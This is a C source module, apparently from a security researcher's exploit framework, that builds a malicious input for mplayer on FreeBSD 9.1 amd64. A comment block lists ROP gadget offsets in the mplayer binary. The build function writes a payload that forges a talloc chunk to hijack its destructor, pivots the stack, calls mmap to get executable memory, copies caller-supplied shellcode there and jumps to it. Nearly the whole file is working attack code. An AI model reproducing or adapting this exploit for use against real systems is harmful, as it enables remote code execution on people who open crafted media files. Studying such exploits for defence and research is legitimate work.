/* Copyright (C) 2014 Lab Mouse Security
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
/*
###############################################################
#
# gadget chain
#

# stack pivot chain
#
_usr_local_bin_mplayer: asm=RET found at offset=125828 realistic_peer=1,1
LEAVE			# return to talloc->prev

# stack padding chain
#
_usr_local_bin_mplayer: asm=RET found at offset=409546 realistic_peer=13,5
ADD RSP, 0x298
POP RBX
POP RBP
POP R12
POP R13

# populate_mmap
#
_usr_local_bin_mplayer: asm=RET found at offset=153026 realistic_peer=1,1
POP RSI

_usr_local_bin_mplayer: asm=RET found at offset=156364 realistic_peer=1,1
POP RDX

_usr_local_bin_mplayer: asm=RET found at offset=220896 realistic_peer=1,1
POP RCX

_usr_local_bin_mplayer: asm=RET found at offset=1183658 realistic_peer=2,1
POP R8

# call mmap_anon
#
   0x000000000051db93 <+3>:     mov    %r8,%r9
   0x000000000051db96 <+6>:     mov    $0xffffffff,%r8d
   0x000000000051db9c <+12>:    or     $0x1002,%ecx
   0x000000000051dba2 <+18>:    jmpq   0x41e10c <mmap@plt>

# populate_memcpy
#
_usr_local_bin_mplayer: asm=RET found at offset=126221 realistic_peer=1,1
POP RBP

_usr_local_bin_mplayer: asm=CALL RBP found at offset=275458 realistic_peer=3,1
MOV RBX, RAX

_usr_local_bin_mplayer: asm=RET found at offset=140870 realistic_peer=1,1
POP RAX			# consume the ret addr

_usr_local_bin_mplayer: asm=RET found at offset=140870 realistic_peer=1,1
POP RAX			# populate rax for next call

_usr_local_bin_mplayer: asm=CALL RAX found at offset=143308 realistic_peer=8,2
LEA RSI, [RSP+0x2c]
MOV RDI, RBX

_usr_local_bin_mplayer: asm=RET found at offset=140870 realistic_peer=1,1
POP RAX			# consume the ret addr

_usr_local_bin_mplayer: asm=RET found at offset=156364 realistic_peer=1,1
POP RDX

# call memcpy@plt
#
0x000000000041dc6c

# call shellcode
#
_usr_local_bin_mplayer: asm=RET found at offset=883894 realistic_peer=1,1
PUSH RDI		# call shellcode; should not need adjustment 

#
###############################################################
*/
#include <crush.h>

#define FRAME_BYTES (1024 + 256 + 256)

#define BASE_ADDR 0x400000ULL
#define GADGET_ADDR(o, a) ((BASE_ADDR) + (o) - (a))

#define TALLOC_SIZE_ADJUST		64
#define PADDING_OFFSET			(0x298 + 8 + 8 + 8 + 8 - TALLOC_SIZE_ADJUST)

#define FAKE_REGISTER 			0xa7a7a7a7a7a7a7a7ULL

#define FAKE_POINTER			0

#define STACK_PIVOT_CHAIN_G1 		GADGET_ADDR(125828, 1)

#define STACK_PADDING_G1		GADGET_ADDR(409546, 13)

#define POPULATE_MMAP_G1 		GADGET_ADDR(153026, 1)
#define POPULATE_MMAP_G2 		GADGET_ADDR(156364, 1)
#define POPULATE_MMAP_G3 		GADGET_ADDR(220896, 1)
#define POPULATE_MMAP_G4 		GADGET_ADDR(1183658, 2)

#define MMAP_SIZE 8192
#define MMAP_PROT (PROT_READ|PROT_WRITE|PROT_EXEC)
#define MMAP_FLAGS (MAP_PRIVATE|MAP_ANONYMOUS)
#define MMAP_OFFSET 0

#define CALL_MMAP_ANON_G1 		0x000000000051db93ULL

#define POPULATE_MEMCPY_G1		GADGET_ADDR(126221, 1)
#define POPULATE_MEMCPY_G2		GADGET_ADDR(275458, 3)
#define POPULATE_MEMCPY_G3		GADGET_ADDR(140870, 1)
#define POPULATE_MEMCPY_G4		GADGET_ADDR(140870, 1)
#define POPULATE_MEMCPY_G5		GADGET_ADDR(143308, 8)
#define POPULATE_MEMCPY_G6		GADGET_ADDR(140870, 1)
#define POPULATE_MEMCPY_G7		GADGET_ADDR(156364, 1)

#define MEMCPY_SHELLCODE_SIZE		/* XXX */ (1128)

#define MEMCPY_AT_PLT			0x000000000041dc6cULL

#define CALL_SHELLCODE_G1		GADGET_ADDR(349162, 1)

static Boolean
build(unsigned char const * input, int ninput, unsigned char ** output, int * noutput)
{
	unsigned char * buffer;
	unsigned char * p;
	unsigned char * q;
	unsigned long * l;
	int n;

	if(ninput > NSIZE)
	{       
		error(False, "payload size exceeds maximum (%d > %d)", ninput, NSIZE);
		return False;
	}

	buffer = calloc(1024, (64 * 1024));
	if(!buffer)
	{
		error(True, "memory allocation failed");
		return False;
	}

	p = buffer;

	{
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 243;

		/* frame starts immediately with padding */
		memset(p, 0xb8, PADDING_OFFSET);
		msg(MsgVerbose, "PADDING = %d\n", PADDING_OFFSET);
		p += PADDING_OFFSET;

		/* now kick off the gadget chain */
		l = (unsigned long * )p;
		*l++ = POPULATE_MMAP_G1;

		/* populate_mmap */
		*l++ = MMAP_SIZE;
		*l++ = POPULATE_MMAP_G2;
		*l++ = MMAP_PROT;
		*l++ = POPULATE_MMAP_G3;
		*l++ = MMAP_FLAGS;
		*l++ = POPULATE_MMAP_G4;
		*l++ = MMAP_OFFSET;
		*l++ = CALL_MMAP_ANON_G1;

		/* populate memcpy */
		*l++ = POPULATE_MEMCPY_G1;
		*l++ = POPULATE_MEMCPY_G3;
		*l++ = POPULATE_MEMCPY_G2;
		*l++ = POPULATE_MEMCPY_G4;
		*l++ = POPULATE_MEMCPY_G6;
		*l++ = POPULATE_MEMCPY_G5;
		*l++ = POPULATE_MEMCPY_G7;
		*l++ = MEMCPY_SHELLCODE_SIZE;
		*l++ = MEMCPY_AT_PLT;

		/* call shellcode */
		*l++ = CALL_SHELLCODE_G1;

		p = (unsigned char * )l;
		n = p - (buffer + 7); /* adjust for the inital 6 bytes */
		msg(MsgVerbose, "total of %d bytes encoded to the fake frame\n", n);

		n = FRAME_BYTES - n;
		msg(MsgVerbose, "padding a total of %d bytes with NOP\n", n);

		memset(p, 0x90, n);

		q = p;
		p += n;

		q += 12;
		memcpy(q, input, ninput);

		msg(MsgVerbose, "p is now %ld\n", p - buffer);

		*p++ = 32;

		p += 16843002;
		*p++ = 138;
		*p++ = 16;
		*p++ = 0;
		*p++ = 0;

		*p++ = 62;

		p += 8;	/* skip first bad pointer */
		p -= 1;
		l = (unsigned long * )p;
		/* overwrite the ->prev pointer */
		*l++ = STACK_PADDING_G1;
		*l++ = FAKE_POINTER;
		*l++ = FAKE_POINTER;
		*l++ = FAKE_POINTER;
		*l++ = STACK_PIVOT_CHAIN_G1; /* destructor */
		*l++ = FAKE_POINTER;
		*l++ = FAKE_POINTER;
		*l++ = 0xe814ec70ULL; /* talloc MAGIC */
		*l++ = 0;

		p = (unsigned char * )l;
		p += 1;

                p += 8;
                *p++ = 16;
               
                *p++ = 1;
                *p++ = 0;
                *p++ = 0;
	}

	*noutput = p - buffer;
	*output = buffer;

	return True;
}

Crushlet
freebsd_9_1_amd64 = 
{
	"freebsd_9_1_amd64",
	Platform_FreeBSD,
	Architecture_x86_64,

	NULL,
	NULL,
	build
};

